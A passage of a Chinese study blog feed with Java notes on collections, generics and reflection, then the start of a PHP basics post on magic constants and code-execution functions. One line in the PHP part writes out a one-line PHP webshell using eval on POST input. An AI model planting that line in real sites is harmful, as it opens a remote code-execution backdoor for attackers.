class="hljs-keyword">public</span> Node next;<br>    <span class="hljs-keyword">public</span> Object item;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Node</span><span class="hljs-params">(Object item)</span> &#123;<br>        <span class="hljs-built_in">this</span>.item = item;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Node&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;item=&quot;</span> + item +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//Node&#123;item=java&#125;</span><br>Node&#123;item=rw&#125;<br>Node&#123;item=urm&#125;<br>Node&#123;item=urm&#125;<br>Node&#123;item=rw&#125;<br>Node&#123;item=java&#125;<br></code></pre></td></tr></table></figure><h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><ul><li><p>无序，没有索引，但是输出顺序固定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">HashSet hashSet=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>    hashSet.add(<span class="hljs-string">&quot;java&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;abc&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;def&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;javsdv&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;rw&quot;</span>);<br>    System.out.println(hashSet);<br><span class="hljs-comment">//[java, abc, def, rw, javsdv]</span><br></code></pre></td></tr></table></figure></li><li><p>不允许重复元素，最多包含一个 null</p></li><li><p>Set 接口是 Collection 子接口，常用方法和 Collection 一样</p></li><li><p>Set 接口遍历方式</p><ul><li>迭代器遍历</li><li>增强 for 遍历</li><li>不能用索引来获取，无法使用普通 for 遍历</li></ul></li></ul><h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><ul><li><p>实际上是 HashMap</p></li><li><p>无序，取决于 hash 后，确定索引结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"> HashSet set=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>    System.out.println(set.add(<span class="hljs-string">&quot;java&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-string">&quot;abc&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-string">&quot;def&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-string">&quot;java&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-literal">null</span>));<br>    set.remove(<span class="hljs-string">&quot;def&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;set&quot;</span>+set);<br><span class="hljs-comment">//true</span><br><span class="hljs-literal">true</span><br><span class="hljs-literal">true</span><br><span class="hljs-literal">false</span><br>truej<br>set[<span class="hljs-literal">null</span>, java, abc]<br></code></pre></td></tr></table></figure></li></ul><p><strong>add 进行的操作</strong></p><ul><li>HashMap 底层是（数组 + 链表 + 红黑树）</li><li>添加一个元素时，先得到 hash 值，然后转化为索引值</li><li>找到存储数据表 table ，看这个索引位置是否已经存放元素，没有就直接加入，有就调用 equals 比较，相同就放弃添加，不同就添加到最后</li><li>如果一条链表元素个数&gt;&#x3D;8,table &gt;&#x3D;64，进行树华</li><li>如果链表没达到 8 ，table 没到 64，先进行数组扩容</li><li>加入 HashMap 中的元素，是否相同由 HashCode 和 equals 方法决定</li></ul><h2 id="LinkedHashSet"><a href="#LinkedHashSet" class="headerlink" title="LinkedHashSet"></a>LinkedHashSet</h2><ul><li>不允许添加重复元素，是HashSet子类，底层是 LinkedHashMap</li><li>遍历顺序和添加顺序一致</li><li>存放元素方式和 HashSet 相同，在此基础上又维护了一个双向链表</li></ul><h2 id="Map-接口"><a href="#Map-接口" class="headerlink" title="Map 接口"></a>Map 接口</h2><ul><li>与 Collection 并列存在。用于保存具有映射关系的数据：Key - Value （双列集合）</li><li>key 和 value 可以是任何引用数据类型，会封装到 HashMap$Node 对象中</li><li>key 不能重复，key 一样时，新的值会替换旧的，value可以重复</li><li>key 可以为 null （只能一个），value 可以为 null (可以多个)</li><li>key 和 value 为单向一对一关系，通过指定 key 可以找到对应的 value</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">  Map hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    hashMap.put(<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;bb&quot;</span>);<br>    hashMap.put(<span class="hljs-string">&quot;pass&quot;</span>,<span class="hljs-string">&quot;word&quot;</span>);<br>    Integer integer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">100</span>);<br>    hashMap.put(integer,<span class="hljs-literal">null</span>);<br>        <br>    System.out.println(hashMap);<br><span class="hljs-comment">//&#123;100=null, pass=word, user=bb&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Map hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    hashMap.put(<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;bb&quot;</span>);<br>    hashMap.put(<span class="hljs-string">&quot;pass&quot;</span>,<span class="hljs-string">&quot;word&quot;</span>);<br>    hashMap.put(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;me&quot;</span>);<br>    Integer integer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">100</span>);<br>    hashMap.put(integer,<span class="hljs-literal">null</span>);<br>    hashMap.remove(<span class="hljs-string">&quot;user&quot;</span>);<br>    System.out.println(hashMap.get(<span class="hljs-string">&quot;pass&quot;</span>));<br>    System.out.println(hashMap.size());<br>    System.out.println(hashMap.isEmpty());<br>    System.out.println(hashMap.containsKey(<span class="hljs-string">&quot;admin&quot;</span>));<br>    System.out.println(hashMap);<br><span class="hljs-comment">//word</span><br><span class="hljs-number">3</span><br><span class="hljs-literal">false</span><br><span class="hljs-literal">true</span><br>&#123;<span class="hljs-number">100</span>=<span class="hljs-literal">null</span>, pass=word, admin=me&#125;<br></code></pre></td></tr></table></figure><h2 id="HashMap-遍历"><a href="#HashMap-遍历" class="headerlink" title="HashMap 遍历"></a>HashMap 遍历</h2><ul><li><p>取出所有的 Key ，通过 key 获取 value</p><ul><li><p>加强 for循环</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Set keyset=hashMap.keySet();<br><span class="hljs-keyword">for</span>(Object key:keyset)&#123;<br>    System.out.println(key+<span class="hljs-string">&quot;-&quot;</span>+hashMap.get(key));<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>迭代器遍历</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Iterator iterator=set.iterator();<br><span class="hljs-keyword">while</span>(iterator.hasNext())&#123;<br>Object keyset=iterator.next();<br>System.out.println(keyset+<span class="hljs-string">&quot;-&quot;</span>+hashMap.get(keyset));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">Set</span> <span class="hljs-variable">keysset</span> <span class="hljs-operator">=</span>hashMap.keySet();<br> keysset.forEach(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Consumer</span>() &#123;<br>      <span class="hljs-meta">@Override</span><br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Object keyset)</span> &#123;<br>         System.out.println(keyset+<span class="hljs-string">&quot;-&quot;</span>+hashMap.get(keyset));<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure></li></ul></li><li><p>取出所有的 value</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Collection values=hashMap.values();<br><span class="hljs-keyword">for</span>(Object value:values)&#123;<br>      System.out.println(value);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>通过 EntrySet 来获取 K-V</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Set entrySet=hashMap.entrySet();<br> <span class="hljs-keyword">for</span> (Object keyset:entrySet)&#123;<br> Map.Entry entry=(Map.Entry)keyset;<br>        System.out.println(entry.getKey()+<span class="hljs-string">&quot;-&quot;</span>+entry.getValue());<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>Key-Value 存放</p></li><li><p>keySet 和 values 返回类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Set set=map.keySet();<br>System.out.println(set.getClass());<br>Collection values=map.values();<br>System.out.println(values.getClass());<br></code></pre></td></tr></table></figure></li></ul><h2 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h2><ul><li>存放键值对：K-V</li><li>键值不能为 null</li><li>使用方法和 HashMap 差不多一样</li></ul><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><ul><li>继承自 Hashtable 类</li><li>用法和 hashmap 一样，键值不能为 null</li></ul><h2 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h2><ul><li><p>如果比较结果器为 0 ，数据不会加入到 TreeSet</p></li><li><p>在构造器中，可以传入一个比较器，指定排序规则</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">TreeSet treeSet=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeSet</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>       <span class="hljs-meta">@Override</span><br>       <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>            <span class="hljs-keyword">return</span> ((String)o2).compareTo((String)o1);<br>       &#125;<br>   &#125;);<br>   treeSet.add(<span class="hljs-string">&quot;abcd&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;abc&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;abd&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;cbd&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;ebd&quot;</span>);<br>        <br>   System.out.println(treeSet);<br><span class="hljs-comment">//[ebd, cbd, abd, abcd, abc]        </span><br></code></pre></td></tr></table></figure></li></ul><h2 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h2><ul><li>可以传入一个比较器，指定排序规则</li><li>如果比较器返回 0 ，则 key 不会加入到 TreeMap，值会替换</li></ul><h2 id="Collections-工具类"><a href="#Collections-工具类" class="headerlink" title="Collections 工具类"></a>Collections 工具类</h2><ul><li>是一个操作 Set、List 和 Map等集合的工具类，提供一系列静态方法</li></ul><h3 id="排序相关"><a href="#排序相关" class="headerlink" title="排序相关"></a>排序相关</h3><ul><li>reverse ( List ):反转 List 元素的顺序</li><li>shuffle ( List ) : 随机打乱</li><li>sort ( List ) : 按升序排序</li><li>sort (List,Comparator ) : 制定规则进行排序</li><li>swap ( List，int i，int  j ) : 将 i 和 j 处元素进行交换</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java">ArrayList arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>    arrayList.add(<span class="hljs-number">100</span>);<br>    arrayList.add(<span class="hljs-number">200</span>);<br>    arrayList.add(<span class="hljs-number">300</span>);<br>    arrayList.add(<span class="hljs-number">400</span>);<br>    arrayList.add(<span class="hljs-number">500</span>);<br>    arrayList.add(<span class="hljs-number">600</span>);<br>    arrayList.add(<span class="hljs-number">700</span>);<br>    arrayList.add(<span class="hljs-number">800</span>);<br>    arrayList.add(<span class="hljs-number">900</span>);<br>    System.out.println(arrayList);  <span class="hljs-comment">//[100, 200, 300, 400, 500, 600, 700, 800, 900]</span><br>     <br><span class="hljs-comment">//reverse(List):对 List 元素进行反转</span><br>    Collections.reverse(arrayList);<br>    System.out.println(arrayList);      <span class="hljs-comment">//[900, 800, 700, 600, 500, 400, 300, 200, 100]</span><br>        <br><span class="hljs-comment">//shuffle(List):对 List 集合元素进行随机打乱</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>        Collections.shuffle(arrayList);<br>          System.out.println(arrayList);<br>    &#125;<br>        <br><span class="hljs-comment">//sort(List):按升序排序</span><br>   Collections.sort(arrayList);<br>      System.out.println(arrayList);  <span class="hljs-comment">//[100, 200, 300, 400, 500, 600, 700, 800, 900]</span><br>        <br><span class="hljs-comment">//swap(List,int,int):将指定 List 集合的 i 处元素和 j 处元素交换</span><br>   Collections.swap(arrayList,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>);<br>      System.out.println(arrayList);      <span class="hljs-comment">//[100, 200, 300, 600, 500, 400, 700, 800, 900]</span><br></code></pre></td></tr></table></figure><h3 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h3><ul><li><p>Object max &#x2F; min（Collection &#x2F; Collecton，Comparator）：根据顺序 &#x2F; 指定规则返回最大 &#x2F; 小元素</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Object max=Collections.max(arrayList);<br>System.out.println(max);<br></code></pre></td></tr></table></figure></li><li><p>int frequency ( collection,Object ) :返回指定元素出现个数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> frequency=Collections.frequency(arrayList,<span class="hljs-number">500</span>);<br>System.out.println(frequency);<br></code></pre></td></tr></table></figure></li><li><p>void copy （List dest，List src）:将 src 内容复制到 dest 中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">ArrayList new_arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(arrayList.size());<br>   <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arrayList.size(); i++) &#123;<br>      new_arrayList.add(<span class="hljs-number">0</span>);  <br>   &#125;<br>  Collections.copy(new_arrayList,arrayList);<br>  System.out.println(new_arrayList);<br></code></pre></td></tr></table></figure></li><li><p>boolean replaceAll（List list，Object oldVal，Object newVal）：使用新值替换所有旧值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Collections.replaceAll(new_arrayList,<span class="hljs-number">200</span>,<span class="hljs-number">1000</span>);<br>System.out.println(new_arrayList);<br></code></pre></td></tr></table></figure></li></ul><h3 id="集合的使用和选择"><a href="#集合的使用和选择" class="headerlink" title="集合的使用和选择"></a>集合的使用和选择</h3><p><strong>判断需要存储数据类想</strong></p><ul><li>一组对象</li><li>一组键值对</li></ul><p><strong>一组对象（单列）：Collection 接口</strong></p><ul><li><p>允许重复：List</p><ul><li>增删多：LinkedList （底层是双向链表）</li><li>改查多：ArrayList（底层是 Object 类型的可变数组）</li></ul></li><li><p>不允许重复：Set</p><ul><li>无序：HashSet（底层是 HashMap，数组 + 链表 +红黑树）</li><li>排序：TreeSet</li><li>插入和取出顺序一致：LinkedHashSet（底层是数组 + 双向链表）</li></ul></li></ul><p><strong>一组键值对（双列）：Map 接口</strong></p><ul><li>键无序：HashMap（ 数组 + 链表 + 红黑树 ）</li><li>键排序：TreeMap</li><li>键插入和取出顺序一致：LinkedHashMap</li><li>读取文件：Properties</li></ul><h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li><p>public class ArrayList&lt;E&gt;</p><p>………</p><p>&lt;E&gt;的 E 为泛型，随意表示</p></li><li><p>带一个或多个类型参数的类或接口</p></li></ul><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><ul><li>interface List&lt;T&gt;{ }</li><li>class HashMap&lt;K,V&gt;{ }</li><li>T、K、V 代表表示类型</li></ul><h2 id="泛型实例化"><a href="#泛型实例化" class="headerlink" title="泛型实例化"></a>泛型实例化</h2><ul><li>HashMap&lt;String，String&gt;   hashMap &#x3D; new HashMap&lt;&gt;( )；</li><li>Iterator&lt;Map.Entry&lt;String,String&gt;&gt;  iterator &#x3D; entries.iterator( )；</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();等价于 HashMap&lt;Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br></code></pre></td></tr></table></figure><h3 id="自定义泛型类"><a href="#自定义泛型类" class="headerlink" title="自定义泛型类"></a>自定义泛型类</h3><ul><li>不指定类型默认为 Object</li></ul><h3 id="自定义泛型接口"><a href="#自定义泛型接口" class="headerlink" title="自定义泛型接口"></a>自定义泛型接口</h3><ul><li>接口中静态成员不能使用泛型</li><li>类型在继承接口或类实现接口时确定</li></ul><h3 id="自定义泛型方法"><a href="#自定义泛型方法" class="headerlink" title="自定义泛型方法"></a>自定义泛型方法</h3><ul><li><p>带类型参数的方法</p></li><li><p>泛型方法可以定义在泛型和普通类里面。使用泛型的方法未定义泛型</p></li><li><p>可以使用自己声明的泛型，也可以使用类声明的泛型</p></li><li><p>在调用时会确定类型</p></li></ul><h3 id="泛型通配符-“-？”"><a href="#泛型通配符-“-？”" class="headerlink" title="泛型通配符 “ ？”"></a>泛型通配符 “ ？”</h3><ul><li><p>泛型没有继承</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Object&gt; list=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();<br></code></pre></td></tr></table></figure></li><li><p><code>&lt;?&gt;</code> : 支持任意泛型类型，任何类型的 List 对象</p></li><li><p><code>&lt;? extends A&gt;</code> : 接受 A 或 A 的子类，规定上限</p></li><li><p><code>&lt;? super A&gt; </code>: A 类或 A 的父类，规定下限</p></li></ul><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><ul><li>在不修改源码时，控制程序，不知道类结构情况下获取类的结构信息</li><li>可以突破访问修饰符的限制</li></ul><h2 id="Class-类的方法"><a href="#Class-类的方法" class="headerlink" title="Class 类的方法"></a>Class 类的方法</h2><table><thead><tr><th>方法名</th><th>作用描述</th></tr></thead><tbody><tr><td>getName</td><td>获取全类名</td></tr><tr><td>getSimpleName</td><td>获取简单类名</td></tr><tr><td>getSuperClass</td><td>以 Class 形式返回父类信息</td></tr><tr><td>getInterface</td><td>以 Class [ ] 形式返回接口信息</td></tr><tr><td>getFiled &#x2F; getFields</td><td>获取 public 修饰的字段，包含本类和父类</td></tr><tr><td>getDeclaredFiled &#x2F; getDeclaredFileds</td><td>获取本类所有字段</td></tr><tr><td>getMethod &#x2F; getMethods</td><td>获取 public 修饰的方法，包含本类和父类</td></tr><tr><td>getDeclaredMethod &#x2F; getDeclaredMethods</td><td>获取本类所有方法（包括私有）</td></tr><tr><td>getConstructors</td><td>获取本类 public 修饰的构造器</td></tr><tr><td>getDeclearedConstructors</td><td>获取本类所有构造器</td></tr><tr><td>getPackage</td><td>以 Package 形式返回包信息</td></tr><tr><td>getAnnotations</td><td>以 Annotation 形式返回注解信息</td></tr><tr><td>getClass</td><td>得到运行类型</td></tr><tr><td>newInstance</td><td>创建对象</td></tr><tr><td>getClassLoader</td><td>得到类加载器</td></tr><tr><td>forName</td><td>得到类对象</td></tr></tbody></table><h2 id="Class-类对象获取方式"><a href="#Class-类对象获取方式" class="headerlink" title="Class 类对象获取方式"></a>Class 类对象获取方式</h2><ul><li>Class.forName ( … )</li><li>类.class用于参数传递</li><li>对象.getClass ( )</li><li>ClassLoader.loadClass ( … )</li><li>基本数据类型的 Class 类对象获取   int.class    Integer.TYPE</li><li>基本数据类型的 Class 类对象获取    Integer.class</li></ul><h2 id="Class-类对象"><a href="#Class-类对象" class="headerlink" title="Class 类对象"></a>Class 类对象</h2><ul><li>外部类</li><li>成员内部类，静态内部类，局部内部类，匿名内部类</li><li>interface：接口</li><li>数组</li><li>enum：枚举     Thread.State</li><li>annotation：注解</li><li>基本数据类型</li><li>void</li></ul><h2 id="Class-类的方法-1"><a href="#Class-类的方法-1" class="headerlink" title="Class 类的方法"></a>Class 类的方法</h2><p>反射创造对象</p><ul><li>无参构造器</li><li>有参构造器</li><li>私有构造器</li></ul><p>反射操作属性</p><ul><li>获取属性</li><li>设置属性</li><li>私有属性</li><li>如果是静态属性，第一个参数可以给 null</li></ul><p>反射操作方法</p><ul><li>获取方法<ul><li>getMethod</li></ul></li></ul><h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><p>java . lang . reflect .Filed 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getType：以 Class 形式返回类型</li><li>getName：返回属性名</li></ul><p>java . lang . reflect . Method 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getReturnType：以 Class 形式获取返回类型</li><li>getName：返回方法名</li><li>getParameterTypes：以 Class [ ] 返回参数类型数组</li></ul><p>java . lang . reflect . Constructor 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getName：返回构造器名（全类名）</li><li>getParameterTypes：以 Class [ ] 返回参数类型数组</li><li>newInstance</li></ul><p>差不多就到这了，笔记比较简洁，里面有很多比较简单的东西没写，可能因为篇幅太长了，传上来的时候老是出现奇奇怪怪的问题，大半夜的差点给我干破防 qwq，搞了好半天才弄好呜呜呜呜呜……</p><p><img src="/qwq.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>语言</category>
      
      <category>Java</category>
      
      <category>Java 基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP 基础(部分)</title>
    <link href="/2024/11/08/PHP%E5%9F%BA%E7%A1%80-%E9%83%A8%E5%88%86/"/>
    <url>/2024/11/08/PHP%E5%9F%BA%E7%A1%80-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p>关于 PHP 的一小部分知识</p><span id="more"></span><h1 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h1><p>如 <code>__FILE__</code> 这样的预定义常量，被称为魔术常量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">__FILE__</span><span class="hljs-comment">// 返回文件完整的路径和文件名</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">//代码高亮显示当前文件内容</span><br><span class="hljs-keyword">__LINE__</span><span class="hljs-comment">// 表示当前行号</span><br><span class="hljs-keyword">__FILE__</span><span class="hljs-comment">// 表示当前文件名</span><br><span class="hljs-keyword">__DIR__</span><span class="hljs-comment">// 表示当前文件所在的目录</span><br><span class="hljs-keyword">__FUNCTION__</span><span class="hljs-comment">// 表示当前函数名</span><br><span class="hljs-keyword">__CLASS__</span><span class="hljs-comment">// 表示当前类名</span><br><span class="hljs-keyword">__METHOD__</span><span class="hljs-comment">// 表示当前方法名</span><br><span class="hljs-keyword">__NAMESPACE__</span><span class="hljs-comment">// 表示当前命名空间</span><br></code></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">include</span>(): 包含并运行指定文件，包含文件发生错误，程序警告，但会继续执行<br><span class="hljs-built_in">include_once</span>(): 检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次<br><span class="hljs-built_in">require</span>(): 包含并运行指定的文件，包含文件发生错误时，程序直接终止执行<br><span class="hljs-built_in">require_once</span>():和 require 类似，不同处在于 require_once 只导入一次<br><span class="hljs-built_in">fopen</span>(): 打开一个文件或 URL<br><span class="hljs-built_in">file_get_contents</span>(): 读取文件的全部内容到一个字符串，例如 <span class="hljs-variable">$content</span> = <span class="hljs-built_in">file_get_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-built_in">file_put_contents</span>(): 将一个字符串写入文件。例如：<span class="hljs-built_in">file_put_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">eval</span>(): 将字符串当中php代码来执行，比如: 一句话木马@<span class="hljs-built_in">eval</span>(_POST[<span class="hljs-string">&quot;1&quot;</span>]);<br><span class="hljs-built_in">assert</span>(): 检测执行条件是否为 true<br></code></pre></td></tr></table></figure><p>调用系统底层的4个方法-system , shell_exec , exec , passthru</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">system</span>(): 调用系统底层，执行系统命令，例如 <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>); 列出当前目录下所有文件<br><span class="hljs-built_in">shell_exc</span>(): 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回<br><span class="hljs-built_in">exec</span>():执行一个外部程序<br><span class="hljs-built_in">passthru</span>():执行外部程序并且显示原始输出，当所执行的 